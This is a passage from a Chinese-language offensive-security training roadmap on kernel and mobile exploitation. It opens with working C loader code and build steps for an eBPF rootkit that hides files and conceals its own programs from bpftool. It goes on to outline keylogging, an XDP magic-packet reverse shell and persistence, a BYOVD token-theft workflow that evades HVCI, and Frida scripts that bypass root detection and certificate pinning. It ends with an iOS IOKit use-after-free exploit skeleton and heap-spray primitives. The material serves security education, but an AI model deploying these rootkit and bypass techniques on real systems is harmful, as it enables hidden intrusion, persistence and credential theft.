    struct bpf_program *prog_exit  = bpf_object__find_program_by_name(obj_fh, "hook_exit_getdents64");
    struct bpf_link *link_e = bpf_program__attach(prog_enter);
    struct bpf_link *link_x = bpf_program__attach(prog_exit);

    // 将目标文件加入 hidden_files 映射：
    int map_fh_fd = bpf_object__find_map_fd_by_name(obj_fh, "hidden_files");
    char key[64] = {};
    __u8  val    = 1;
    strncpy(key, target, 63);
    bpf_map_update_elem(map_fh_fd, key, &val, BPF_ANY);

    // ---- 加载自我隐藏后门 -----------------------------------------------
    struct bpf_object *obj_sh = bpf_object__open("rootkit_selfhide.bpf.o");
    bpf_object__load(obj_sh);

    struct bpf_program *prog_bpf_enter = bpf_object__find_program_by_name(obj_sh, "hook_bpf_enter");
    struct bpf_program *prog_bpf_exit  = bpf_object__find_program_by_name(obj_sh, "hook_bpf_exit");
    struct bpf_link *link_be = bpf_program__attach(prog_bpf_enter);
    struct bpf_link *link_bx = bpf_program__attach(prog_bpf_exit);

    // 获取我们自己程序的 ID 并加入 hidden_prog_ids：
    int map_sh_fd = bpf_object__find_map_fd_by_name(obj_sh, "hidden_prog_ids");

    struct bpf_program *progs[] = {
        prog_enter, prog_exit, prog_bpf_enter, prog_bpf_exit, NULL
    };

    __u8 hide_val = 1;
    for (int i = 0; progs[i] != NULL; i++) {
        int prog_fd  = bpf_program__fd(progs[i]);
        struct bpf_prog_info info = {};
        __u32 info_len = sizeof(info);
        bpf_obj_get_info_by_fd(prog_fd, &info, &info_len);
        __u32 prog_id = info.id;
        printf("[+] Hiding prog ID: %u (%s)\n", prog_id,
               bpf_program__name(progs[i]));
        bpf_map_update_elem(map_sh_fd, &prog_id, &hide_val, BPF_ANY);
    }

    printf("[+] File '%s' hidden from ls\n", target);
    printf("[+] All rootkit programs hidden from bpftool prog list\n");
    printf("[*] Rootkit active. Press Ctrl+C to detach.\n");

    while (1) sleep(60);

    // 收到信号时清理：
    bpf_link__destroy(link_e);  bpf_link__destroy(link_x);
    bpf_link__destroy(link_be); bpf_link__destroy(link_bx);
    bpf_object__close(obj_fh);  bpf_object__close(obj_sh);
    return 0;
}
```

```bash
# 构建后门的两个组件：
sudo apt install clang libbpf-dev bpftool

clang -O2 -target bpf -c rootkit.bpf.c -o rootkit.bpf.o
clang -O2 -target bpf -c rootkit_selfhide.bpf.c -o rootkit_selfhide.bpf.o
gcc -o loader_full loader_full.c -lbpf

# 测试：
echo "secret data" > secret.txt

# 加载前：
sudo bpftool prog list   # 仅显示已存在的程序

# 加载后门：
sudo ./loader_full secret.txt &

# 验证文件隐藏：
ls                       # secret.txt 消失了
cat secret.txt           # 仍然可读

# 验证自我隐藏：
sudo bpftool prog list   # 我们的程序不会出现

# 验证它们确实在运行（如果已固定，可通过 /sys/fs/bpf，或通过 dmesg）：
sudo cat /proc/self/fdinfo/*  # 原始内核接口绕过了我们的挂钩
```

### eBPF 后门能力

```
除了文件隐藏之外：

进程隐藏：
  挂钩 /proc 上的 getdents64 -> 从目录列表中移除 /proc/<PID>
  与文件隐藏相同的模式，按 pid 目录名过滤。

网络后门（XDP）：
  XDP 在网卡驱动层挂钩——位于内核网络栈之前。
  对 tcpdump 完全不可见（它运行在 XDP 之上）。
  用途：接收魔术包 -> 触发反弹 shell 或权限提升。

键盘记录：
  挂钩 /dev/tty、/dev/pts/*（终端设备）上的 read()。
  每次按键都会经过 read() -> 在挂钩点捕获。

持久化：
  将 BPF 程序固定到 /sys/fs/bpf/：
    bpf_link__pin(link, "/sys/fs/bpf/my_rootkit");
  程序在进程退出后仍存活。
  启动持久化：在开机时运行加载器的 systemd 服务。
```

---

## 区块 13：HVCI、VBS 与 2026-2027 内核安全

### 架构概览

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/6._HVCI,_VBS_AND_KERNEL_SECURITY_2026-2027.png" alt="Architecture Overview: HVCI, VBS AND KERNEL SECURITY 2026-2027" width="800"/>

</td></tr></table>
</div>

---


### HVCI 终止了什么，什么能存活

```
HVCI 终止的：
  - 未签名内核态代码注入（池/栈中的 shellcode：被阻断）
  - 加载未签名 .sys 驱动的经典后门：被阻断
  - 即使拥有 ring-0 写原语的内核 shellcode 执行：被阻断
  - 对内核 .text 段的代码补丁：被阻断

在 HVCI 下存活的：
  - 使用 HVCI 兼容的已签名驱动进行 BYOVD（不注入代码，仅数据读/写）
  - 仅数据攻击：破坏 EPROCESS.Token、凭据结构
  - Hypervisor 后门（Ring -1）：拥有 VTL1 之上的 hypervisor
  - 固件攻击：UEFI 后门在 Hyper-V 加载之前运行
  - 已签名但存在漏洞、带任意读/写 IOCTL 的驱动（loldrivers.io）

攻击层级（2026-2027）：
  Ring 3（用户）    -> Ring 0（内核，需要漏洞）
  Ring 0           -> Ring -1（hypervisor，需要 UEFI/启动漏洞）
  Ring -1          -> 完全控制，HVCI 无关紧要
  UEFI             -> 跨操作系统重装持久化

针对 HVCI 的 BYOVD 工作流程：
  1. 加载带任意读/写 IOCTL 的已签名、HVCI 兼容驱动
  2. 使用读原语：读取 System 进程的 EPROCESS
  3. 提取 System 的 Token 值
  4. 使用写原语：将 System 的 Token 写入当前进程的 EPROCESS.Token
  5. 全程在数据空间——内核中无代码执行，HVCI 不会触发
  6. 进程现在拥有 SYSTEM 令牌——生成 shell
```

---

## 区块 14：移动安全 -- Android 与 iOS

**时间：6-8 周 | 难度：非常难**

### Android 安全资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [OWASP MASTG Android](https://mas.owasp.org/MASTG/Android/) | 指南 | 8 小时 | 免费 | 全面的 Android 安全评估 |
| [Frida 文档](https://frida.re/docs/android/) | 文档 | 3 小时 | 免费 | Android Frida 官方指南 |
| [Android 安全内部结构（Elenkov）](https://nostarch.com/androidsecurity) | 书籍 | 15 小时 | 付费 | 深入 Android 安全架构 |
| [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) | 工具 | 2 小时 | 免费 | 自动化移动应用分析 |

### Android 动态分析

```bash
# 环境准备：已 root 的 Android 设备或模拟器
# 在设备上安装 frida-server：
adb push frida-server /data/local/tmp/
adb shell chmod +x /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# 列出正在运行的应用：
frida-ps -U

# 附加到应用：
frida -U -f com.target.app --no-pause -l hook_android.js
```

```javascript
// hook_android.js——Android Java 与原生挂钩

// 挂钩 Java 方法：
Java.perform(function() {
    var Activity = Java.use('android.app.Activity');
    Activity.onCreate.overload('android.os.Bundle').implementation = function(bundle) {
        console.log('[*] Activity.onCreate called');
        this.onCreate(bundle);
    };

    // 挂钩加密以捕获明文：
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(input) {
        console.log('[*] Cipher.doFinal input: ' + hexdump(input));
        var result = this.doFinal(input);
        console.log('[*] Cipher.doFinal output: ' + hexdump(result));
        return result;
    };

    // 绕过 root 检测：
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('[*] isRooted bypass: returning false');
        return false;
    };
});
```

### iOS 安全资源

| 资源 | 类型 | 时长 | 成本 | 备注 |
|---|---|---|---|---|
| [OWASP MASTG iOS](https://mas.owasp.org/MASTG/iOS/) | 指南 | 8 小时 | 免费 | 全面的 iOS 安全评估 |
| [Frida iOS](https://www.frida.re/docs/ios/) | 文档 | 3 小时 | 免费 | Frida iOS 官方指南 |
| [Project Zero iOS](https://googleprojectzero.blogspot.com/search/label/iOS) | 博客 | 持续更新 | 免费 | 全部读完。最前沿的 iOS 安全研究。 |
| [palera1n 越狱](https://palera.in/) | 工具 | 2 小时 | 免费 | 用于设备端测试的现代 iOS 越狱 |
| [XNU 内核源码](https://github.com/apple-oss-distributions/xnu) | 源码 | 20+ 小时 | 免费 | 阅读它以理解你在利用什么。 |

### iOS 应用层

```bash
# 从越狱设备解密 IPA：
# frida-ios-dump：https://github.com/AloneMonkey/frida-ios-dump
python3 dump.py -H 127.0.0.1 -p 2222 com.target.app

# 检查二进制：
otool -l Payload/AppName.app/AppName | grep -A 4 LC_ENCRYPTION_INFO_64
# cryptid = 0：未加密，可直接分析

# 安全特性：
otool -hv AppName | grep -E "PIE|STACK_CANARIES"
codesign -d --entitlements - AppName

# 反编译：
# Ghidra 或 IDA Pro：打开二进制 -> ARM64 反编译
class-dump AppName -H --output headers/

# 动态分析（越狱设备）：
frida -U -f com.target.app --no-pause -l hook_ios.js
```

```javascript
// hook_ios.js——iOS Objective-C 与 Swift 挂钩

// 记录所有 HTTP 请求：
var session = ObjC.classes.NSURLSession;
Interceptor.attach(
    session['- dataTaskWithRequest:completionHandler:'].implementation,
    {
        onEnter: function(args) {
            var request = ObjC.Object(args[2]);
            console.log('[*] URL: ' + request.URL().absoluteString());
        }
    }
);

// 禁用证书固定：
var SecTrustEvaluateWithError = Module.findExportByName('Security',
    'SecTrustEvaluateWithError');
Interceptor.attach(SecTrustEvaluateWithError, {
    onLeave: function(retval) { retval.replace(1); }
});
```

```bash
# SSL 证书固定绕过：
objection -g com.target.app explore
# ios sslpinning disable

# Keychain 导出：
keychain-dumper -a
```

### iOS 内核利用方法论

<div align="center">
<table><tr><td>

<img src="../assets/diagrams/PHASE_3/7._iOS_Kernel_Exploitation_Methodology.png" alt="iOS Kernel Exploitation Methodology" width="250"/>

</td></tr></table>
</div>


### iOS CVE 走查——IOKit UAF 利用（缺口已补齐）

本节将 CVE-2021-30955（iOS 15 沙箱逃逸，由 Google Project Zero 披露）中的攻击模式综合为一份研读式走查。该 CVE 已完全修补。本节仅用于对该技术的教育性分析。

```
CVE-2021-30955：IOKit 用户客户端竞争条件
影响：iOS 14.x，在 iOS 15.2 中修复
报告者：Saar Amar（MSRC）
类型：IOKit 用户客户端中的释放后使用

根因：
  某 IOKit 驱动的外部方法允许两个线程之间发生竞争条件：
  线程 A：通过 ExternalMethod 选择子 N 分配一个内核对象
  线程 B：通过 ExternalMethod 选择子 M 释放该对象
  如果线程 B 赢得竞争，线程 A 会继续使用已释放的对象（UAF）。

利用链（高层）：

1. 准备：打开存在漏洞的 IOKit 服务：
   io_connect_t conn;
   IOServiceOpen(service, mach_task_self(), 0, &conn);

2. 喷洒（在触发缺陷之前）：
   分配 4096 个 Mach port（ipc_port_t，每个 168 字节 = 0xA8）。
   它们将回收已释放的 zone 槽位。
   for (int i = 0; i < 4096; i++)
       mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);

3. 触发竞争：
   线程 A：IOConnectCallMethod(conn, SELECTOR_ALLOC, ...)——分配对象
   线程 B：IOConnectCallMethod(conn, SELECTOR_FREE, ...)——释放对象
   同步：使用信号量在 A 的分配与首次使用之间安排线程 B。
   经过足够多次重试（约 1000 次），线程 B 能可靠地赢得竞争。

4. 类型混淆：
   已释放的对象（zone 槽位）现在被我们的某个 ipc_port_t 喷洒对象占据。
   当驱动稍后解引用过期指针时，它会把 ipc_port_t 的字段
   当作原始驱动结构体字段来读取。
   ipc_port_t 包含：ip_receiver（位于已知偏移的 task 指针）。

5. 泄露：
   驱动的过期解引用暴露了 ip_receiver（一个内核 task 指针）。
   从触发 ExternalMethod 调用的返回值中读取该指针。
   使用泄露的 task 指针计算：kernel_slide = leaked_task - known_offset。

6. 伪造对象：
   已知 kernel_slide 后：计算内核符号的地址。
   使用写原语（另一个 IOCTL 或 UAF 写路径）将
   伪造的 ipc_port_t 放置在受控位置。
   将 ip_receiver 设置为指向我们控制的伪造 task 结构体。
   伪造 task 的 bsd_info 字段指向伪造的 proc 结构体。
   伪造 proc 的 p_ucred 字段指向我们构造的凭据（uid=0）。

7. 权限提升：
   触发一次 MIG 调用，遍历：port -> task -> bsd_info -> proc -> ucred。
   内核读取我们伪造的 ucred（uid=0），并将其用于能力检查。
   我们现在在沙箱内是 root。

8. 沙箱逃逸（需要单独的缺陷或权限绕过）：
   沙箱内的 root 仍然无法访问 /etc/shadow、/data 等。
   完整沙箱逃逸需要单独的 TCC 绕过或 SIP 绕过。
   CVE-2021-30955 提供了 root；沙箱逃逸是另外串联的。
```

```c
// 文件：ios_uaf_skeleton.c
// 基于 CVE-2021-30955 模式的带注释利用骨架。
// 这是来自公开披露的教育性综合，不是可用的利用。
// 要求：特定存在漏洞的 iOS 版本 + 驱动 + 适用于你的构建的偏移。

#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>
#include <pthread.h>
#include <semaphore.h>

// 第 1 步：查找并打开存在漏洞的 IOKit 服务
io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
    IOServiceMatching("VulnerableIOKitDriver"));

if (service == IO_OBJECT_NULL) {
    puts("[-] Service not found");
    return 1;
}

io_connect_t conn;
kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &conn);
if (kr != KERN_SUCCESS) {
    printf("[-] IOServiceOpen failed: 0x%x\n", kr);
    return 1;
}

// 第 2 步：喷洒 Mach port 以回收已释放的 zone 槽位
// arm64 上 ipc_port_t 大小 = 0xA8 字节 = 168 字节
// 如果存在漏洞的对象也是 0xA8 字节，它们共享同一个 zone。
#define SPRAY_COUNT 4096
mach_port_t ports[SPRAY_COUNT];

for (int i = 0; i < SPRAY_COUNT; i++) {
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
    // 每次分配都会在内核的 zone 分配器中给我们一个 ipc_port_t。
    // 有 4096 个 port，我们就能主导该大小类的 zone。
}
printf("[+] Sprayed %d Mach ports (ipc_port_t objects)\n", SPRAY_COUNT);

// 第 3 步：触发竞争条件
// 线程 A 分配对象，线程 B 释放它。
// 我们使用信号量在 A 从分配到使用的时间窗口内安排线程 B。
sem_t race_sem;
sem_init(&race_sem, 0, 0);

// （在真实利用中：启动线程 B，让它在信号量上等待，线程 A 在
//  IOCTL_ALLOC 与 IOCTL_USE 之间发出信号，线程 B 调用 IOCTL_FREE）
// 完整实现：参见 Ian Beer 在 GitHub 上的 Project Zero PoC。

// 第 4 步：UAF 之后——通过驱动的过期指针读取被混淆的 ipc_port_t
// 驱动尝试从“原始”结构体中读取字段 X。
// 字段 X 与 ipc_port_t.ip_receiver（内核 task 指针）重叠。
// 这给了我们一个内核指针泄露。

uint64_t leaked_ptr = 0;
// kr = IOConnectCallMethod(conn, SELECTOR_READ_STALE, ..., &leaked_ptr, ...);
// printf("[+] Leaked kernel pointer: 0x%llx\n", leaked_ptr);

// 第 5 步：从泄露的指针计算 kernel slide
// kernel_slide = leaked_ptr - known_symbol_static_offset;
// 已知 slide：所有内核符号都可计算。

printf("[*] For a complete CVE-specific walkthrough:\n");
printf("    Read: https://googleprojectzero.blogspot.com/search/label/iOS\n");
printf("    Specifically: Ian Beer's 'A look at iMessage in iOS 14'\n");
printf("    and the FORCEDENTRY analysis for data-only chain context.\n");

IOServiceClose(conn);
return 0;
```

### iOS 堆布局原语参考

```c
// iOS 的堆布局原语（相当于 Linux 上的 msg_msg）：

// 1. IOSurface（最佳——大小可控，无需权限即可使用）：
IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)@{
    @"IOSurfaceWidth":  @1,
    @"IOSurfaceHeight": @1,
    @"IOSurfaceBytesPerElement": @4,
    @"IOSurfacePixelFormat": @(kCVPixelFormatType_32BGRA),
    // 关键：将 IOSurfaceAllocSize 设为控制确切的分配大小：
    @"IOSurfaceAllocSize": @(168)   // 目标大小：必须与存在漏洞的对象匹配
});

// 2. Mach port 喷洒（arm64 上 ipc_port_t = 168 字节）：
mach_port_t port;
for (int i = 0; i < 4096; i++)
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);

// 3. 管道缓冲区（pipe_buffer 结构体：多个大小类）：
int pipefd[2];
pipe(pipefd);
// 首次写入会在内核中分配 pipe_buffer：大小 = >= write_size 的下一个 2 的幂
write(pipefd[1], spray_data, target_size);

// 4. VM map 条目（vm_map_entry_t，大小可变）：
void *addr;
vm_allocate(mach_task_self(), (vm_address_t*)&addr, target_size, VM_FLAGS_ANYWHERE);
```

---

## CTF 进阶与实验资源

### 阶段 3 的 CTF 平台

| 平台 | 重点 | 成本 | 备注 |
|---|---|---|---|
| [pwn.college](https://pwn.college) | 二进制漏洞利用、内核 | 免费 | 结构最好的课程。必修。 |
| [HackTheBox](https://hackthebox.com) | 全领域 | 约 $14/月 | 二进制与内核挑战种类丰富 |
| [pwnable.kr](https://pwnable.kr) | 二进制漏洞利用 | 免费 | 韩国 CTF，非常优秀 |
| [ropemporium](https://ropemporium.com) | ROP 链 | 免费 | 完成全部 8 个挑战 |
| [how2heap](https://github.com/shellphish/how2heap) | 堆利用 | 免费 | 每种技术的可用示例 |
| [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) | Windows 内核 | 免费 | Windows 内核训练的标准靶场 |
| [VulnHub](https://www.vulnhub.com) | 下载 + 本地 | 免费 | 免费、离线 |

### 从阶段 2 到阶段 3 的桥梁

**在开始阶段 3 之前先做这些：**

阅读《Hacking: The Art of Exploitation》（Erickson）中的以下章节：
- 第 2 章：编程（C 基础、指针、内存）
- 第 3 章：漏洞利用（栈溢出机制）

这是强制性的。不要跳过。这些章节正是阶段 3 能够成立的原因。

**在阶段 3 第 1 天之前理解这些概念：**
- 什么是栈帧，以及它为何存在
- 保存的 RBP 和保存的 RIP 是什么，它们位于何处
- 调用约定意味着什么，使用哪些寄存器
- malloc 和 free 在基本层面上如何工作
- 什么是系统调用，参数如何传递

> 阶段 2 与阶段 3 之间的鸿沟正是大多数人放弃之处。他们在没有栈基础的情况下接触二进制漏洞利用，然后停下。上面的桥梁可以防止这种情况。

---

## 最后说明——0.0001% 的标准

阶段 3 不是清单。它是基础。这里的每项技术——ROP 链、堆布局、内核利用、eBPF 后门、PAC 绕过——都是阶段 4 的构建块，在那里你将编写工具、寻找 0-day 并构建植入体。

里程碑要求书面分析而不只是可用的 shell，原因只有一个：你在不理解的情况下得到的 shell，是你无法复现、改编或防御的 shell。理解本身才是交付物。

本文档中的每项技术都是由某个没有停下的人发现的。这就是整个架构。

---
